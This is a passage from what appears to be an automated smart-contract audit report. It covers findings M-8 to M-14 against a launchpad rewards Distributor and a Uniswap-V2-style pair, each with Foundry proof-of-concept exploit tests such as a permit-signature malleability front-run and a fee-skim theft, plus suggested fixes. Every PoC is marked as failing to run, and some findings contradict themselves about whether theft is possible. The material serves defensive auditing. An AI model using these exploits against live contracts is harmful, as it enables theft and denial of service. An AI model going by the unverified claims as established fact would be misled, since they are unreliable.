### Finding Severity Justification: Rewards accounting relies on uint96 for user shares and totalShares. If the launched token’s effective unit supply (tokens * 10^decimals) exceeds ~7.9e28, totalShares will eventually overflow and revert during staking, causing denial of service for bonding/launchpad flows. This impacts protocol availability and usability rather than directly stealing assets, fitting Medium per rubric.
## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
Distributor.increaseStake

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: LaunchToken/Launchpad scaling of shares is not included in the provided code; if they downscale amounts before passing to Distributor, overflow may be avoided. Absent that evidence, the uint96 cap presents a realistic DoS vector.
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `Distributor` and `RewardsTrackerLib` use `uint96` to track `shares` and `totalShares`. `uint96` has a maximum value of ~7.9e28. Many Launchpad tokens (especially meme tokens) have total supplies exceeding this (e.g., 1e12 tokens * 1e18 decimals = 1e30). If such a token is launched, `increaseStake` will revert due to overflow when users attempt to stake amounts exceeding the `uint96` limit, rendering the Launchpad functionality broken for these assets.

## Impact
Denial of Service for high-supply tokens. Popular tokenomics (e.g., 'meme' coins with supplies like 1e15 units * 1e18 decimals = 1e33) vastly exceed `type(uint96).max` (~7.9e28). Since `totalShares` is `uint96`, the protocol will inevitably revert on arithmetic overflow once the cumulative stake exceeds this cap, breaking core Launchpad functionality (transfers/staking) for these assets.

## Command to Run Test


## Proof of Concept
1. Deploy a Distributor and initialize it.
2. Simulate a token with a supply of 1e30 (approx. 1 trillion * 1e18).
3. Stake an amount of `type(uint96).max / 2 + 100` for User A. This succeeds.
4. Attempt to stake the same amount for User B.
5. The transaction reverts because `totalShares` (uint96) cannot hold the sum, causing an arithmetic overflow panic. This confirms that the protocol cannot support the token's full supply.

## Proof of Code
function test_uint96_overflow_DoS() public {
    Distributor distributor = new Distributor();
    distributor.initialize(address(this)); // Test contract acts as Launchpad

    address asset = address(0x123);
    address user1 = address(0x1);
    address user2 = address(0x2);

    // ~ 7.9e28
    uint96 halfMax = type(uint96).max / 2;
    // A realistic high-supply token usually has >>> type(uint96).max supply.
    // We simulate the accumulation of shares exceeding the cap.
    uint96 stakeAmount = halfMax + 1000;

    // 1. First user stakes effectively half the max capacity
    distributor.increaseStake(asset, user1, stakeAmount);

    // 2. Second user tries to stake similar amount
    // This would push totalShares > type(uint96).max
    vm.expectRevert(); // Expect arithmetic overflow (Panic code 0x11)
    distributor.increaseStake(asset, user2, stakeAmount);
}

## Suggested Mitigation
Change `shares` and `totalShares` to `uint256` in `UserRewardData` and `RewardPoolData` structs. Crucially, also update `baseRewardDebt` and `quoteRewardDebt` to `uint256` (or `uint128` if sufficient), as debt calculation `(shares * accRewardPerShare) / 1e12` will easily exceed `uint96` when shares are large. Finally, update the `increaseStake` and `decreaseStake` function signatures in `IDistributor` and `Distributor` to accept `uint256`.


## [M-8]. Unclaimed Fees Exposed to Skimming via FeeAccountingDrift

### Finding Severity Justification: If the scenario holds, an attacker could skim undistributed swap fees from the pair, diverting protocol revenue. This does not directly impact user funds, but recurring loss of fee revenue is material enough for Medium per C4 rubric.
## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
GTELaunchpadV2Pair._update

## Finding Status: NeedsMoreInfo
### Finding Status Justification: The exploit relies on the Distributor.addRewards not pulling the tokens after the pair grants allowance and calls it. In _update, accrued fees are zeroed before _distributeLaunchpadFees, and reserves are set to balance - totalFees based on pre-call balances. If the Distributor indeed transfersFrom the pair (as is typical), balances will drop by the fee and skim will have nothing to take; if it reverts, the whole tx reverts and accrued are not cleared. The report does not include the actual Distributor implementation nor a working PoC showing addRewards succeeds without transferring tokens. Please provide Distributor.addRewards code or a reproducible test proving addRewards returns successfully while leaving the tokens in the pair.
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: The pair’s logic is only exploitable if the Distributor violates expected semantics. Without the Distributor code, the claim is speculative. If the Distributor pulls tokens on addRewards (most likely), the issue does not manifest.
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In `_update`, the `reserve` variables are reduced by `totalLaunchpadFee` under the assumption that these fees are immediately distributed (transferred out) or will be pulled by the Distributor. If the `Distributor` fails to pull the tokens (e.g. implementation quirk or error), the physical `balanceOf` the contract remains high while `reserve` is lowered. The `skim` function allows anyone to withdraw `balance - reserve - accrued` (where accrued is deleted in `_update`), effectively allowing theft of the untransferred fees.

## Impact
Loss of protocol revenue; untransferred fees can be stolen by any user calling `skim`.

## Command to Run Test


## Proof of Concept
1. The `_update` function receives the current contract balances (`balance0`, `balance1`) as arguments.
2. It calculates `totalLaunchpadFee` and subtracts this amount from `balance` to determine the new `reserve` (`reserve = balance - fee`), assuming the fee is transferred out immediately.
3. It calls `_distributeLaunchpadFees`, which approves the `Distributor` and calls `addRewards`.
4. If the `Distributor` (which is an external contract) returns success but fails to transfer the tokens (due to logic bugs, pausing, or configuration), the tokens remain in the Pair contract.
5. The `reserve` is now recorded as `balance - fee`, but the actual contract balance is still `balance`.
6. An attacker calls `skim`. `skim` calculates `excess = currentBalance - reserve`. Substituting the values: `excess = balance - (balance - fee) = fee`.
7. The attacker receives the untransferred fee tokens.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "../contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// Mock Tokens
contract MockERC20 is ERC20 {
    constructor() ERC20("Mock", "MCK") {
        _mint(msg.sender, 1000000 * 10**18);
    }
}

// Buggy Distributor that does NOT pull tokens
contract MockDistributor {
    function addRewards(address t0, address t1, uint128 a0, uint128 a1) external {
        // Simulate a successful call that fails to pull funds
        return;
    }
}

contract GTELaunchpadV2PairTest is Test {
    GTELaunchpadV2Pair pair;
    MockERC20 token0;
    MockERC20 token1;
    MockDistributor distributor;
    address launchpadLp = address(0x123);

    function setUp() public {
        token0 = new MockERC20();
        token1 = new MockERC20();
        distributor = new MockDistributor();
        
        pair = new GTELaunchpadV2Pair();
        // Initialize: Factory is this test contract (msg.sender in constructor)
        pair.initialize(address(token0), address(token1), launchpadLp, address(distributor));
    }

    function testSkimTheft() public {
        uint256 liquidity = 1000 ether;
        token0.transfer(address(pair), liquidity);
        token1.transfer(address(pair), liquidity);
        pair.mint(address(this));

        // Simulate LP tokens held by Launchpad to enable fee accrual
        // REWARDS_FEE_SHARE calculation depends on launchpadLpBal
        pair.transfer(launchpadLp, pair.balanceOf(address(this)) / 2);

        // Perform a swap to generate fees
        uint256 amountIn = 10 ether;
        token0.transfer(address(pair), amountIn);
        
        // Swap output doesn't matter for this test, just triggering _update
        pair.swap(0, 0.1 ether, address(this), "");

        // At this point, _update assumed fees were pulled and lowered reserves.
        // But MockDistributor did not pull them.
        (uint112 res0, , ) = pair.getReserves();
        uint256 actualBal0 = token0.balanceOf(address(pair));

        // Verify drift: Actual Balance > Reserve (by the fee amount)
        assertGt(actualBal0, uint256(res0), "Balance should be higher than reserve due to unpulled fee");

        uint256 skimAmount = actualBal0 - res0;
        console.log("Skimmable Amount:", skimAmount);
        assertGt(skimAmount, 0, "There should be skimmable fees");

        // Attacker Skims
        address attacker = address(0xBAD);
        pair.skim(attacker);

        assertEq(token0.balanceOf(attacker), skimAmount, "Attacker stole the fees");
    }
}

## Suggested Mitigation
Replace the `approve` and `call` pattern with a `safeTransfer` 'Push' pattern. This ensures tokens physically leave the contract before the reserves are updated, maintaining accounting invariants. 

**Recommended Change:**
```solidity
function _distributeLaunchpadFees(uint112 fee0, uint112 fee1) internal {
    if ((fee0 | fee1) > 0) {
        address distributor = launchpadFeeDistributor;
        // Push tokens directly instead of approving
        if (fee0 > 0) _safeTransfer(token0, distributor, fee0);
        if (fee1 > 0) _safeTransfer(token1, distributor, fee1);
        
        // Notify distributor (ensure addRewards handles pre-transferred funds if needed)
        IDistributor(distributor).addRewards(token0, token1, uint128(fee0), uint128(fee1));
        
        emit LaunchpadFeesCollected(fee0, fee1);
    }
}
```





 **Derived From** : AccessControl

## [M-9]. Theft of rewards via unchecked quote asset in addRewards

### Finding Severity Justification: The core bug is real: addRewards does not validate that the provided quoteAsset matches the pool’s immutable rs.quoteAsset. This allows anyone to inflate pendingQuoteRewards with an arbitrary token. While this does not enable theft (payouts use rs.quoteAsset and are capped by totalPendingRewards[rs.quoteAsset]), it can cause denial-of-service for claims and stake/unstake flows because _decreaseTotalPending will revert due to insufficient recorded pending for the real quote asset. This impacts protocol availability and user operations, not direct loss of assets, which fits Medium per the rubric.
## Derived From Pattern/Invariant
AccessControl

## Exploit Type
AccessControl

## Location
Distributor.addRewards

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `Distributor.addRewards` function accepts two token addresses (`token0`, `token1`) and amounts. It identifies the reward pool by checking if either token corresponds to a valid `launchAsset`. However, once the pool is identified, the function fails to verify that the other token (treated as `quoteAsset`) matches the pool's immutable `rs.quoteAsset`. An attacker can call `addRewards(ValidLaunchToken, FakeToken, 0, Amount)`. The contract accepts `FakeToken` (transferring it from the attacker) but increments the `rs.pendingQuoteRewards` accumulator. Subsequently, legitimate users calling `claimRewards` are paid out from the pool's actual `quoteAsset` (e.g., USDC) reserve because `claimRewards` uses the stored `rs.quoteAsset` address. This allows an attacker to drain the Distributor's entire quote asset balance by inflating the reward accumulator with worthless tokens.

## Impact
Permanent Denial of Service (DoS) and Fund Locking. By adding worthless tokens as rewards to a valid pool, an attacker inflates the pool's internal `pendingQuoteRewards` accumulator. However, this action only increases the global `totalPendingRewards` for the worthless token, not the pool's actual quote asset. When legitimate users subsequently attempt to `claimRewards`, `increaseStake`, or `decreaseStake`, the contract calculates a payout based on the inflated accumulator. This payout amount exceeds the contract's tracked `totalPendingRewards` for the real quote asset, causing `_decreaseTotalPending` to revert with `ClaimAmountExceedsTotalPendingRewards`. This effectively freezes the reward pool and locks users' staked principal.

## Command to Run Test


## Proof of Concept
1. **Setup:** A valid pool exists (LaunchToken/USDC). User A has staked LaunchToken and there are legitimate pending rewards.
2. **Attack:** Attacker deploys a `FakeToken` and calls `distributor.addRewards(LaunchToken, FakeToken, 0, HugeAmount)`.
3. **Corruption:** The Distributor identifies the pool via LaunchToken but accepts FakeToken as the quote asset. It inflates the pool's internal `rs.pendingQuoteRewards` but updates the global tracker `totalPendingRewards[FakeToken]` (leaving `totalPendingRewards[USDC]` unchanged).
4. **DoS:** User A calls `claimRewards` or `decreaseStake`.
5. **Revert:** The contract calculates the user's quote share based on the inflated rewards. It then calls `_decreaseTotalPending(USDC, inflatedAmount)`. Since `totalPendingRewards[USDC]` is less than the inflated amount, the transaction reverts, locking the user's funds.

## Proof of Code
function test_exploit_addRewards_DoS() public {
    // Setup: Create pool and user stakes
    vm.startPrank(launchpad);
    distributor.createRewardsPair(address(launchToken), address(usdc));
    distributor.increaseStake(address(launchToken), user, 100 ether);
    vm.stopPrank();

    // Add legitimate rewards to ensure a non-zero claim would normally work
    deal(address(usdc), address(this), 100 ether);
    IERC20(address(usdc)).approve(address(distributor), 100 ether);
    distributor.addRewards(address(launchToken), address(usdc), 0, 100 ether);

    // Attack: Add rewards using a fake token
    vm.startPrank(attacker);
    MockERC20 fake = new MockERC20("FAKE", "FAKE", 18);
    fake.mint(attacker, 1000 ether);
    fake.approve(address(distributor), 1000 ether);
    // This corrupts the internal accounting
    distributor.addRewards(address(launchToken), address(fake), 0, 1000 ether);
    vm.stopPrank();

    // Verify DoS: User cannot claim or unstake due to accounting mismatch
    vm.startPrank(user);
    
    vm.expectRevert(Distributor.ClaimAmountExceedsTotalPendingRewards.selector);
    distributor.claimRewards(address(launchToken));

    vm.expectRevert(Distributor.ClaimAmountExceedsTotalPendingRewards.selector);
    distributor.decreaseStake(address(launchToken), user, 50 ether);
    
    vm.stopPrank();
}

## Suggested Mitigation
In `Distributor.addRewards`, immediately after identifying the `RewardPoolData` storage `rs`, enforce that the token designated as `quoteAsset` matches the pool's immutable `rs.quoteAsset`.

```solidity
// ... existing logic to determine launchAsset/quoteAsset/rs ...

if (rs.quoteAsset != quoteAsset) revert RewardsDoNotExist(); // Or a custom error like InvalidQuoteAsset()

// ... existing logic to add rewards ...
```





 **Derived From** : GriefableCallbacks

## [M-10]. Claiming blocked by coupled asset transfer failure

### Finding Severity Justification: Users’ rewards become unclaimable due to atomic payout of two assets. If the quote token transfer reverts (e.g., blacklist/freeze/pause), the entire claim reverts, preventing users from receiving even the base-asset rewards. This is a realistic DoS on availability of user funds, but does not directly steal funds; hence Medium rather than High.
## Derived From Pattern/Invariant
GriefableCallbacks

## Exploit Type
Dos

## Location
Distributor.claimRewards

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `claimRewards` function distributes both `baseAsset` and `quoteAsset` in the same transaction via `_distributeAssets`. If the `quoteAsset` (e.g. USDC) transfer fails (e.g. due to blacklist or pause), the user cannot claim their `baseAsset` rewards either. The failure of one asset griefs the other.

## Impact
Users are completely blocked from claiming their Base Asset rewards if the Quote Asset transfer fails. This creates a significant external dependency risk; for example, if the Quote Asset is a centralized stablecoin (e.g., USDC) and the user is blacklisted, or if the stablecoin contract is paused globally, the user's Base Asset rewards are locked indefinitely (DoS), as the atomic transaction will always revert.

## Command to Run Test


## Proof of Concept
1. A reward pool exists with a Base Asset (Project Token) and a Quote Asset (e.g., USDC).
2. A user has staked tokens and accrued rewards in both assets.
3. The Quote Asset contract enters a state where transfers fail for this user (e.g., USDC blacklist or global pause).
4. The user calls `claimRewards(baseAsset)`.
5. The contract calculates rewards and attempts to transfer the Base Asset (success) and then the Quote Asset (failure).
6. Due to the atomic nature of the transaction, the Quote Asset transfer failure reverts the entire execution.
7. The user cannot retrieve their Base Asset rewards.

## Proof of Code
contract DistributorDoSTest is Test {
    Distributor distributor;
    MockERC20 baseToken;
    MockERC20 quoteToken;
    address user = address(0xBEEF);

    function setUp() public {
        distributor = new Distributor();
        baseToken = new MockERC20();
        quoteToken = new MockERC20();
        
        // Initialize distributor with test contract as launchpad to allow privileged calls
        distributor.initialize(address(this));
        distributor.createRewardsPair(address(baseToken), address(quoteToken));
        
        // Mint tokens for rewards
        baseToken.mint(address(this), 1000e18);
        quoteToken.mint(address(this), 1000e18);
        baseToken.approve(address(distributor), 1000e18);
        quoteToken.approve(address(distributor), 1000e18);
    }

    function test_ClaimBlockedByQuoteFailure() public {
        // 1. User stakes (ensure shares > 0 before adding rewards)
        distributor.increaseStake(address(baseToken), user, 100e18);

        // 2. Add rewards to pool
        distributor.addRewards(address(baseToken), address(quoteToken), 50e18, 50e18);

        // 3. Verify user has pending rewards
        (uint256 pBase, uint256 pQuote) = distributor.getPendingRewards(address(baseToken), user);
        assertEq(pBase, 50e18);
        assertEq(pQuote, 50e18);

        // 4. Simulate Quote Asset failure (e.g. Paused/Blacklisted)
        // Assuming MockERC20 has a helper to force transfer failures
        quoteToken.setTransferFail(true);

        // 5. User attempts to claim, expecting revert due to Quote failure
        vm.startPrank(user);
        vm.expectRevert(); // Specific error depends on SafeTransferLib (TransferFailed)
        distributor.claimRewards(address(baseToken));
        vm.stopPrank();
    }
}

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    bool public transferFail;

    function mint(address to, uint256 amount) public { balanceOf[to] += amount; }
    function approve(address spender, uint256 amount) public { allowance[msg.sender][spender] = amount; }
    function setTransferFail(bool _fail) public { transferFail = _fail; }

    function transfer(address to, uint256 amount) public returns (bool) {
        if (transferFail) return false;
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        if (transferFail) return false;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

## Suggested Mitigation
Refactor `claimRewards` to allow users to claim assets independently. Create separate functions `claimBaseRewards()` and `claimQuoteRewards()`, or add a boolean parameter to `claimRewards` (e.g., `bool claimQuote`) to skip the failing asset transfer. This ensures that a freeze on one asset does not lock the user's other rewards.





 **Derived From** : SignatureMalleability

## [L-11]. Permit Signature Malleability allows Front-running DoS

### Finding Severity Justification: The issue enables griefing/DoS of the permit flow by consuming a user's nonce via a malleable signature, but does not allow theft of funds or unauthorized approvals. Impact is limited to transaction failure and user inconvenience requiring a re-sign/re-send.
## Derived From Pattern/Invariant
SignatureMalleability

## Exploit Type
SignatureMalleability

## Location
UniswapV2ERC20.permit

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: Slight scope ambiguity because the code is imported from a Uniswap V2-style module; however, it is inherited and used by an in-scope contract, making the impact manifest within scope.
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `permit` function in `UniswapV2ERC20` uses `ecrecover` without validating that the `s` value of the signature is in the lower half of the secp256k1 curve. This allows an attacker to create a valid malleable signature (using `n - s`) and front-run a user's `permit` transaction. The front-run tx consumes the nonce, causing the user's original transaction to revert.

## Impact
Denial of Service (DoS) of user transactions relying on `permit`; griefing.

## Command to Run Test


## Proof of Concept
1. User generates a valid permit signature `(v, r, s)` for their current nonce.
2. Attacker observes the signature in the mempool.
3. Attacker calculates the malleable equivalent: `s' = secp256k1n - s` and flips `v'` (if `v` is 27, `v'` is 28, and vice versa).
4. Attacker submits a `permit` transaction with `(v', r, s')` front-running the user.
5. The contract accepts the malleable signature, approves the spender, and increments the user's nonce.
6. The user's original transaction executes but reverts ("INVALID_SIGNATURE") because the on-chain nonce has changed, causing the reconstructed message digest to mismatch the one signed by the user.

## Proof of Code
function testPermitMalleability() public {
    // Setup
    uint256 privateKey = 0xBEEF;
    address owner = vm.addr(privateKey);
    address spender = address(0xCAFE);
    uint256 value = 100e18;
    uint256 deadline = block.timestamp + 1000;

    // 1. Sign the permit (User's intended action)
    bytes32 domainSeparator = token.DOMAIN_SEPARATOR();
    bytes32 typeHash = token.PERMIT_TYPEHASH();
    uint256 nonce = token.nonces(owner);
    
    bytes32 structHash = keccak256(abi.encode(typeHash, owner, spender, value, nonce, deadline));
    bytes32 digest = keccak256(abi.encodePacked("\x19\x01", domainSeparator, structHash));
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, digest);

    // 2. Create Malleable Signature (Attacker calculation)
    // secp256k1 curve order n
    uint256 n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
    bytes32 s_prime = bytes32(n - uint256(s));
    uint8 v_prime = v == 27 ? 28 : 27;

    // 3. Attacker front-runs with malleable signature
    token.permit(owner, spender, value, deadline, v_prime, r, s_prime);

    // 4. Verify state change
    assertEq(token.nonces(owner), nonce + 1);
    assertEq(token.allowance(owner, spender), value);

    // 5. User's original transaction fails because nonce moved
    vm.expectRevert("UniswapV2: INVALID_SIGNATURE");
    token.permit(owner, spender, value, deadline, v, r, s);
}

## Suggested Mitigation
Require `uint256(s) <= 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0` in `permit`.





 **Derived From** : UnsafeRecipient

## [H-12]. Rewards Misdirected to Launchpad Contract instead of User

### Finding Severity Justification: Pending rewards calculated for a user during stake/unstake are transferred to msg.sender inside _distributeAssets. For increaseStake/decreaseStake, msg.sender is the Launchpad (onlyLaunchpad), not the user account. User reward debts are updated as if rewards were paid, so the user’s future claimable rewards are reduced while the actual tokens are sent to the Launchpad. This causes real asset loss for users unless a separate forwarding mechanism exists, which is not evident in the provided code.
## Derived From Pattern/Invariant
UnsafeRecipient

## Exploit Type
StandardViolation

## Location
Distributor.increaseStake

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: If the Launchpad contract (not included here) explicitly forwards these tokens to the user within the same flow, the impact would be mitigated. Since that code was not provided, the finding is assessed based on the Distributor implementation alone.
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
The functions `increaseStake` and `decreaseStake` in `Distributor` are `onlyLaunchpad`. They call `_distributeAssets` to pay out pending rewards to the user. However, `_distributeAssets` transfers tokens to `msg.sender`. Since `increaseStake` is called by the Launchpad contract, `msg.sender` is the Launchpad address, not the user `account`. Unless the Launchpad has specific logic to forward these tokens (which is not standard), the user's rewards are permanently stuck in the Launchpad contract.

## Impact
Permanent loss of user rewards during staking/unstaking operations initiated by the Launchpad.

## Command to Run Test


## Proof of Concept
1. User buys tokens on Launchpad. 2. Launchpad calls `Distributor.increaseStake(asset, user, amount)`. 3. `Distributor` calculates pending rewards for `user`. 4. `Distributor` transfers rewards to `msg.sender` (Launchpad). 5. User receives nothing.

## Proof of Code
function test_RewardsMisdirectedToLaunchpad() public {
    address user = makeAddr("user");
    address asset = address(rewardToken);
    address quote = address(quoteToken);

    // 1. Initial stake by Launchpad for user (establishes shares)
    vm.startPrank(launchpad);
    distributor.increaseStake(asset, user, 100 ether);
    vm.stopPrank();

    // 2. Add rewards to the pool (simulating fee accrual)
    uint128 rewardAmt = 50 ether;
    deal(asset, address(this), rewardAmt);
    IERC20(asset).approve(address(distributor), rewardAmt);
    distributor.addRewards(asset, quote, rewardAmt, 0);

    // 3. Trigger distribution via a second interaction
    uint256 userBalBefore = IERC20(asset).balanceOf(user);
    uint256 launchpadBalBefore = IERC20(asset).balanceOf(launchpad);

    vm.startPrank(launchpad);
    // This call calculates pending rewards from step 1 and sends them to msg.sender
    distributor.increaseStake(asset, user, 10 ether);
    vm.stopPrank();

    // 4. Verify rewards went to Launchpad instead of User
    assertEq(IERC20(asset).balanceOf(user), userBalBefore, "User received no rewards");
    assertGt(IERC20(asset).balanceOf(launchpad), launchpadBalBefore, "Launchpad received the user rewards");
}

## Suggested Mitigation
Modify `_distributeAssets` to accept a `recipient` argument and transfer to `recipient` instead of `msg.sender`. Update `increaseStake` and `decreaseStake` to pass `account` as the recipient.





 **Derived From** : Dos

## [M-13]. Critical DoS risk via reverting Distributor callback

### Finding Severity Justification: GTELaunchpadV2Pair performs an external call to the Distributor in _update via _distributeLaunchpadFees on every state-changing path (swap/mint/burn/sync). Any revert in the Distributor (logic bug, paused state, token approval/transfer incompatibility) will revert the pool operation, temporarily freezing swaps and LP exits. While user funds are not stolen, availability of core functionality is impacted and liquidity can be stuck until governance intervenes (e.g., ending rewards), which fits Code4rena’s Medium: protocol function/availability impact without direct asset theft.
## Derived From Pattern/Invariant
Dos

## Exploit Type
Dos

## Location
GTELaunchpadV2Pair._update

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: The Distributor implementation details are not fully provided here, so the precise conditions for addRewards to revert are unknown. However, the architectural coupling (unprotected external call inside the pair’s critical path) is evident and commonly leads to DoS if the callee reverts. If the Distributor is guaranteed not to revert under any circumstance, the impact would be mitigated; absent that guarantee, the finding stands.
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `_update` function calls `_distributeLaunchpadFees`, which executes an external call to `IDistributor(launchpadFeeDistributor).addRewards`. This call occurs on every state-changing action (`swap`, `mint`, `burn`). If the `Distributor` contract reverts (due to logic bugs, gas limits, paused state, or blacklisted token transfers), the `_update` function will revert. This permanently freezes the liquidity pool, preventing all swaps and liquidity events.

## Impact
Permanent freezing of user funds and trading (Denial of Service).

## Command to Run Test


## Proof of Concept
1. `Distributor` logic is upgraded or enters a state where `addRewards` reverts (e.g. out of gas or paused).
2. User calls `swap`.
3. `swap` -> `_update` -> `_distributeLaunchpadFees` -> `distributor.addRewards` (Reverts).
4. Transaction fails. Pool is unusable.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";

// Simple Mock Token
contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 value) public { balanceOf[to] += value; }
    function transfer(address to, uint256 value) public returns (bool) {
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        return true;
    }
    function approve(address spender, uint256 value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        return true;
    }
}

// Mock Distributor that can be toggled to revert
contract MockDistributor {
    bool public shouldRevert;
    function setShouldRevert(bool _s) external { shouldRevert = _s; }
    function addRewards(address, address, uint128, uint128) external view {
        require(!shouldRevert, "Distributor: DoS");
    }
}

contract GTELaunchpadV2PairDoSTest is Test {
    GTELaunchpadV2Pair pair;
    MockERC20 token0;
    MockERC20 token1;
    MockDistributor distributor;

    function setUp() public {
        token0 = new MockERC20();
        token1 = new MockERC20();
        distributor = new MockDistributor();
        pair = new GTELaunchpadV2Pair();
        
        // Ensure tokens are sorted for the pair
        (address t0, address t1) = address(token0) < address(token1) 
            ? (address(token0), address(token1)) 
            : (address(token1), address(token0));
            
        pair.initialize(t0, t1, address(0xdead), address(distributor));

        // Add initial liquidity
        token0.mint(address(pair), 1000 ether);
        token1.mint(address(pair), 1000 ether);
        pair.mint(address(this));
    }

    function testDistributorDoS() public {
        // 1. Perform a swap to generate accrued fees
        token0.mint(address(pair), 10 ether);
        pair.swap(0, 5 ether, address(this), "");
        
        // 2. Advance time. `_update` only distributes fees if timeElapsed > 0
        vm.warp(block.timestamp + 100);
        
        // 3. Simulate broken distributor (e.g. paused, out of gas, bug)
        distributor.setShouldRevert(true);
        
        // 4. Attempt a swap. 
        // The Pair will try to call addRewards in _update, fail, and revert the whole tx.
        token0.mint(address(pair), 10 ether);
        vm.expectRevert("Distributor: DoS");
        pair.swap(0, 5 ether, address(this), "");
    }
}

## Suggested Mitigation
Wrap the external call in a `try/catch` block within the `_update` function (or the internal helper). Crucially, if the call fails, the accrued fees must not be lost; they should remain in `accruedLaunchpadFee0/1` to be retried in future transactions.

```solidity
// In GTELaunchpadV2Pair._update

if (launchpadFeeDistributor > address(0)) {
    if ((totalLaunchpadFee0 | totalLaunchpadFee1) > 0) {
        // Attempt distribution with try/catch
        // Note: _safeApprove calls here or inside a helper
        if (totalLaunchpadFee0 > 0) _safeApprove(token0, launchpadFeeDistributor, totalLaunchpadFee0);
        if (totalLaunchpadFee1 > 0) _safeApprove(token1, launchpadFeeDistributor, totalLaunchpadFee1);

        try IDistributor(launchpadFeeDistributor).addRewards(token0, token1, uint128(totalLaunchpadFee0), uint128(totalLaunchpadFee1)) {
            // Success: Clear accrued fees
            delete accruedLaunchpadFee0;
            delete accruedLaunchpadFee1;
            emit LaunchpadFeesCollected(totalLaunchpadFee0, totalLaunchpadFee1);
        } catch {
            // Failure: Update accrued fees to include new fees so they aren't lost
            // They will be retried in the next update with timeElapsed > 0
            accruedLaunchpadFee0 = totalLaunchpadFee0;
            accruedLaunchpadFee1 = totalLaunchpadFee1;
        }
    }
}
```


## [M-14]. AMM Pair denial of service when Distributor shares are zero

### Finding Severity Justification: Swaps (and mint/burn/sync that call _update) can be permanently reverted while rewards are active if the Distributor has zero totalShares, causing the AMM pair to be effectively bricked until an admin intervention ends rewards. This is a denial-of-service with significant availability impact and can temporarily trap LP/user liquidity, but does not directly enable theft of funds. Admin can unbrick by calling endRewards, so impact is mitigable.
## Derived From Pattern/Invariant
Dos

## Exploit Type
Dos

## Location
GTELaunchpadV2Pair._update

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `GTELaunchpadV2Pair._update` function attempts to distribute fees by calling `IDistributor(distributor).addRewards`. The `Distributor.addRewards` function strictly reverts with `NoSharesToIncentivize` if `rs.totalShares == 0`. If `totalShares` drops to zero (e.g., all users unstake, or during initial setup if transfers/staking are misaligned), every swap on the Uniswap pair will revert. This completely bricks the liquidity pool, preventing any trading or exit.

## Impact
Total Denial of Service of the AMM pair.

## Command to Run Test


## Proof of Concept
1. All users unstake from Distributor (or pool is initialized before stakes exist).
2. `totalShares` in Distributor is 0.
3. User calls `swap` on the Pair.
4. `swap` -> `_update` -> `_distributeLaunchpadFees` -> `addRewards`.
5. `addRewards` reverts `NoSharesToIncentivize`.
6. Transaction fails.

## Proof of Code
contract TestDoS is Test {
    Distributor distributor;
    GTELaunchpadV2Pair pair;
    MockERC20 token0;
    MockERC20 token1;
    address launchpad = address(0x123);
    address launchpadLP = address(0x456);

    function setUp() public {
        token0 = new MockERC20();
        token1 = new MockERC20();
        if (address(token0) > address(token1)) (token0, token1) = (token1, token0);

        distributor = new Distributor();
        distributor.initialize(launchpad);

        pair = new GTELaunchpadV2Pair();
        pair.initialize(address(token0), address(token1), launchpadLP, address(distributor));

        vm.prank(launchpad);
        distributor.createRewardsPair(address(token0), address(token1));
    }

    function test_DoS_ZeroShares() public {
        // 1. Add Liquidity to Pair
        token0.mint(address(pair), 1000 ether);
        token1.mint(address(pair), 1000 ether);
        pair.mint(address(this));

        // 2. Ensure LaunchpadLP has balance so fees are calculated
        uint256 lpBalance = pair.balanceOf(address(this));
        pair.transfer(launchpadLP, lpBalance / 2);

        // 3. Ensure Distributor has 0 shares (default state)
        (uint96 totalShares,,,,,) = distributor.getRewardsPoolData(address(token0));
        assertEq(totalShares, 0);

        // 4. Swap to generate fees -> triggers addRewards -> reverts
        token0.mint(address(this), 10 ether);
        token0.transfer(address(pair), 10 ether);
        
        vm.expectRevert(Distributor.NoSharesToIncentivize.selector);
        pair.swap(0, 5 ether, address(this), "");
    }
}

contract MockERC20 is ERC20 {
    constructor() ERC20("Mock", "MCK") {}
